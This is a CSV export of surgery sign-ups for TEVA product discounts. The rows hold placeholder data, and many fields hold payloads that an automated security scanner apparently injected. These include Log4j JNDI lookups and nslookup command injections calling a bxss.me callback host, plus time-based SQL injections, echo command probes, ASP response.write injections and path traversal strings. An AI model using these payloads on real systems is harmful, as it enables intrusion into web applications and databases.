Unique ID,Surgery Name,Surgery Address 1,Surgery Address 2,Surgery Town,Surgery County,Surgery Post Code,Surgery Email,Surgery Telephone,TEVA Account No,TEVA Manager,Total Patients,Total Patients (Dispensing),Wholesaler Name,Wholesale Account,Wholesale Depot,Discount Axsain 45g,Discount Braltus Zonda 10mcg,Discount DuoResp Spiromax 160mcg/4.5mcg,Discount DuoResp Spiromax 320mcg/9mcg,Discount Qvar MDI 50mcg,Discount Qvar MDI 100mcg,Discount Qvar Easi-Breathe 50mcg,Discount Qvar Easi-Breathe 100mcg,Discount Zacin 45g,Authorised Signatory,Marketing Consent,Terms Agreement,Date Created,Activated,Date Activated,Sending bank details,
6227d11d-38f0-4c6a-ab2f-22888d00a510,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.002626.1416143-6678.1416143.c1cab${::-.}1${::-.}bxss.me}},3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d11c-b584-40cf-8ec0-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,../1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d11b-09e0-4593-9d77-22878d00a510,${j${::-n}di:dns${::-:}${::-/}/hitqsyopjdvrl4df80${::-.}bxss.me}zzzz,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d11b-40c4-4cb6-a462-22848d00a510,znKScqHh,B6XrEvF0,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d11c-d3ec-46e3-a77b-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d11a-8bac-4105-ad16-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d11a-87a8-493c-bfc4-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d119-f028-4c28-b0da-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d119-8d9c-417b-ab4a-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d118-84a8-4406-b6f0-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d117-551c-4550-91b6-22858d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,../znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d117-64a4-4b2e-8ea1-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d117-8c14-4cb8-acf3-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d115-b7b4-4b60-b80d-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d115-e948-43f0-8b66-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d115-7764-4aed-97b5-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d115-764c-4e24-8b4f-22848d00a510,@@19dqu,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d113-b154-4bb2-9fbe-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,../4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d113-3250-4e81-a898-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d113-31dc-438f-afc3-22878d00a510,,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d113-d7b8-43c0-a2bf-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d111-b470-45cc-ba87-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d111-7ba0-4a5f-aa70-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,`(nslookup hitqggwfihhkrfac32.bxss.me||perl -e &quot;gethostbyname(&#039;hitqggwfihhkrfac32.bxss.me&#039;)&quot;)`,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d111-9ed4-4781-a3c2-22818d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d110-fcf4-42ad-b269-22848d00a510,1&#039;&quot;,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d111-d0c4-4bc0-9db7-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10f-ced0-4f32-99ca-22818d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10e-e6fc-4e55-b449-22888d00a510,znKScqHh&#039;||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||&#039;,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10e-df20-460f-89d3-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10e-de0c-4374-98b4-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,../555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10f-8708-4059-a17d-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,|(nslookup hitauaxgdcazxe7cef.bxss.me||perl -e &quot;gethostbyname(&#039;hitauaxgdcazxe7cef.bxss.me&#039;)&quot;),NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10c-ac40-45be-bf29-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10c-5cc8-40b9-98fb-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10c-0254-4ae4-8c02-22858d00a510,q0rmOhCm&#039;)) OR 124=(SELECT 124 FROM PG_SLEEP(15))--,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10d-c988-4e65-83a2-22818d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10c-5734-467c-a004-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10a-e77c-4f47-b7bc-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10a-9bdc-49d7-b179-22818d00a510,6TgEgJUP&#039;) OR 177=(SELECT 177 FROM PG_SLEEP(15))--,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10a-c814-4212-b538-22858d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-08,No,,Yes,
6227d10a-d44c-4645-8804-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d10a-499c-4052-bf73-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,$(nslookup hitlpwywjzvqi82888.bxss.me||perl -e &quot;gethostbyname(&#039;hitlpwywjzvqi82888.bxss.me&#039;)&quot;),NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d108-1c08-4b6c-809c-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d108-d22c-4c59-8b9d-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-08,No,,Yes,
6227d108-5ea4-4496-b87e-22648d00a510,fj5LiXAw&#039; OR 130=(SELECT 130 FROM PG_SLEEP(15))--,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d108-d6c8-448b-8305-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,(nslookup hitmbxapjzbfoa6d86.bxss.me||perl -e &quot;gethostbyname(&#039;hitmbxapjzbfoa6d86.bxss.me&#039;)&quot;),NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d108-b750-47de-86f8-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d106-6968-4070-9c90-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d106-ae0c-4b46-ba7d-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,2022-03-08,No,,Yes,
6227d106-fccc-4b87-bd6b-228a8d00a510,0AmO4T1d&#039;; waitfor delay &#039;0:0:15&#039; -- ,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d106-9190-4494-8b40-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,|echo mmaujh$()\ vxltlf\nz^xyu||a #&#039; |echo mmaujh$()\ vxltlf\nz^xyu||a #|&quot; |echo mmaujh$()\ vxltlf\nz^xyu||a #,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d104-4834-4f34-af63-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d104-ac2c-4812-94db-228a8d00a510,1 waitfor delay &#039;0:0:15&#039; -- ,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d104-863c-4482-8bca-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,No,
6227d103-0e8c-42d2-b457-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,&amp;echo ewmccv$()\ kwzqkt\nz^xyu||a #&#039; &amp;echo ewmccv$()\ kwzqkt\nz^xyu||a #|&quot; &amp;echo ewmccv$()\ kwzqkt\nz^xyu||a #,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d104-f970-46e4-8a8b-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d102-16ac-4ccf-9480-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d102-b310-461f-a2c3-22858d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d102-272c-4f4c-8aff-22818d00a510,(select(0)from(select(sleep(15)))v)/*&#039;+(select(0)from(select(sleep(15)))v)+&#039;&quot;+(select(0)from(select(sleep(15)))v)+&quot;*/,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d102-81c8-42f9-92f5-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,echo wxtumy$()\ hcuyjr\nz^xyu||a #&#039; &amp;echo wxtumy$()\ hcuyjr\nz^xyu||a #|&quot; &amp;echo wxtumy$()\ hcuyjr\nz^xyu||a #,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d101-7f3c-4cce-9cdf-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,../94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d100-4e10-4f39-b750-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d100-3f08-4868-8852-22888d00a510,0&quot;XOR(if(now()=sysdate(),sleep(15),0))XOR&quot;Z,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d100-00ec-4678-a34f-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d0ff-4358-492d-98fb-22818d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d0fe-53f8-4cce-bfc7-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d0fe-d0cc-478c-93aa-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,&quot;+response.write(9899661*9461702)+&quot;,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d0fe-fce8-4caf-a098-22648d00a510,0&#039;XOR(if(now()=sysdate(),sleep(15),0))XOR&#039;Z,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d0fd-38c4-4467-a366-228a8d00a510,znKScqHh,3137 Laguna Street,`(nslookup hitemfdnmydkhbdbc8.bxss.me||perl -e &quot;gethostbyname(&#039;hitemfdnmydkhbdbc8.bxss.me&#039;)&quot;)`,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d0fd-2528-4b67-9eda-22858d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,../NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d0fc-8f00-4eb9-aea0-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,&#039;+response.write(9899661*9461702)+&#039;,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d0fc-5ab8-48c5-afda-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d0fb-891c-4916-8062-22848d00a510,znKScqHh,3137 Laguna Street,|(nslookup hitvpaywhbzbib713f.bxss.me||perl -e &quot;gethostbyname(&#039;hitvpaywhbzbib713f.bxss.me&#039;)&quot;),San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
